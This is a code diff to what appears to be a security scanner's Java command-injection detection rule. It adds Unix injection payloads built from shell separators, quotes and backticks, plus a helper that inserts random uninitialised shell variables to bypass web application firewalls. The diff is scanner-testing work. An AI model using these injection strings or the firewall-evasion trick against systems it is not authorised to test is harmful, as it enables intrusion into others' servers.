@@ -28,6 +28,7 @@ import java.util.List;
 import java.util.Map;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
+import java.util.concurrent.ThreadLocalRandom;
 
 import org.apache.commons.configuration.ConversionException;
 import org.apache.log4j.Logger;
@@ -113,6 +114,24 @@ public class CommandInjectionPlugin extends AbstractAppParamPlugin {
         WIN_OS_PAYLOADS.put("run " + WIN_TEST_CMD, WIN_CTRL_PATTERN);
         PS_PAYLOADS.put(";" + PS_TEST_CMD + " #", PS_CTRL_PATTERN); //chain & comment
         
+	//uninitialized variable waf bypass
+        String insertedCMD = insertUninitVar(NIX_TEST_CMD);
+        // No quote payloads
+        NIX_OS_PAYLOADS.put("&" + insertedCMD + "&", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put(";" + insertedCMD + ";", NIX_CTRL_PATTERN);
+        // Double quote payloads
+        NIX_OS_PAYLOADS.put("\"&" + insertedCMD + "&\"", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("\";" + insertedCMD + ";\"", NIX_CTRL_PATTERN);
+        // Single quote payloads
+        NIX_OS_PAYLOADS.put("'&" + insertedCMD + "&'", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("';" + insertedCMD + ";'", NIX_CTRL_PATTERN);
+        // Special payloads
+        NIX_OS_PAYLOADS.put("\n" + insertedCMD + "\n", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("`" + insertedCMD + "`", NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("||" + insertedCMD, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("&&" + insertedCMD, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("|" + insertedCMD + "#", NIX_CTRL_PATTERN);
+	    
         //Used for *nix
         //OS_PAYLOADS.put("\"|\"ld", null);
         //OS_PAYLOADS.put("'|'ld", null);
@@ -169,6 +188,24 @@ public class CommandInjectionPlugin extends AbstractAppParamPlugin {
         // FoxPro for running os commands
         WIN_BLIND_OS_PAYLOADS.add("run " + WIN_BLIND_TEST_CMD);
         PS_BLIND_PAYLOADS.add(";" + PS_BLIND_TEST_CMD + " #"); //chain & comment
+	    
+	//uninitialized variable waf bypass
+        String insertedCMD = insertUninitVar(NIX_BLIND_TEST_CMD);
+        // No quote payloads
+        NIX_BLIND_OS_PAYLOADS.add("&" + insertedCMD + "&");
+        NIX_BLIND_OS_PAYLOADS.add(";" + insertedCMD + ";");
+        // Double quote payloads
+        NIX_BLIND_OS_PAYLOADS.add("\"&" + insertedCMD + "&\"");
+        NIX_BLIND_OS_PAYLOADS.add("\";" + insertedCMD + ";\"");
+        // Single quote payloads
+        NIX_BLIND_OS_PAYLOADS.add("'&" + insertedCMD + "&'");
+        NIX_BLIND_OS_PAYLOADS.add("';" + insertedCMD + ";'");
+        // Special payloads
+        NIX_BLIND_OS_PAYLOADS.add("\n" + insertedCMD + "\n");
+        NIX_BLIND_OS_PAYLOADS.add("`" + insertedCMD + "`");
+        NIX_BLIND_OS_PAYLOADS.add("||" + insertedCMD);
+        NIX_BLIND_OS_PAYLOADS.add("&&" + insertedCMD);
+        NIX_BLIND_OS_PAYLOADS.add("|" + insertedCMD + "#");
     };
                 
     // Logger instance
@@ -352,6 +389,11 @@ public class CommandInjectionPlugin extends AbstractAppParamPlugin {
                 break;
 
             case HIGH:
+		// Up to around 24 requests / param / page 
+                targetCount = 12;
+                blindTargetCount = 12;
+                break;
+			
             case INSANE:
                 targetCount = Math.max(PS_PAYLOADS.size(), (Math.max(NIX_OS_PAYLOADS.size(), WIN_OS_PAYLOADS.size())));
                 blindTargetCount = Math.max(PS_BLIND_PAYLOADS.size(), (Math.max(NIX_BLIND_OS_PAYLOADS.size(), WIN_BLIND_OS_PAYLOADS.size())));
@@ -623,5 +665,26 @@ public class CommandInjectionPlugin extends AbstractAppParamPlugin {
 
         return result / responseTimes.size();
     }
+	
+    /**
+     *Generate payload variants for uninitialized variable waf bypass
+     *https://www.secjuice.com/web-application-firewall-waf-evasion/
+     *
+     * @param cmd the cmd to insert uninitialized variable
+     */
+    private static String insertUninitVar(String cmd){
+        int varLength = ThreadLocalRandom.current().nextInt(1,3)+1;
+        char[] array = new char[varLength];
+        //$xx
+        array[0]='$';
+        for(int i=1;i<varLength;++i){
+            array[i]=(char)ThreadLocalRandom.current().nextInt(97,123);
+        }
+        String var = new String(array);
+	    
+        //insert variable before each space and '/' in the path
+        return cmd.replaceAll("\\s",Matcher.quoteReplacement(var+" ")).replaceAll("\\/",Matcher.quoteReplacement(var+"/"));
+    }
+
 
 }
